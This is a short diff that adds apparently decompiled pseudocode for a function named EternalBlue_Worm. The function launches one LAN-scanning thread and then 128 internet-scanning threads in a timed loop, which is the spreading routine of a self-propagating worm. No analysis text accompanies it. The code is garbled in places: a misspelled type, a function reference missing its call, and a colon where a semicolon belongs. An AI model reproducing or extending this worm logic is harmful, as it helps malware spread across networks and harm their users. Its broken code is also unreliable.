@@ -1,0 +1,27 @@
+HGLOBAL EternalBlue_Worm()
+{
+HGOBAL result; //eax@1
+void *v1; // eax@2
+signed int v2; //esi@4
+void *v3; // eax@5
+
+result = Init_EternalBlue_Worm90;
+if (result)
+{
+v1 = (void *)beginthreadex(0, 0, EternalBlue_scan_Lan, 0, 0, 0);
+if (v1)
+CloseHandle(v1);
+v2 = 0;
+do
+{
+v3 = (void *)beginthreadex(0, 0, EternalBlue_scan_inet, v2, 0, 0);
+if (v3)
+CloseHandle(v3):
+sleep(0x7D0u);
+++v2;
+}
+while (v2 < 128);
+result = 0;
+}
+return result;
+}
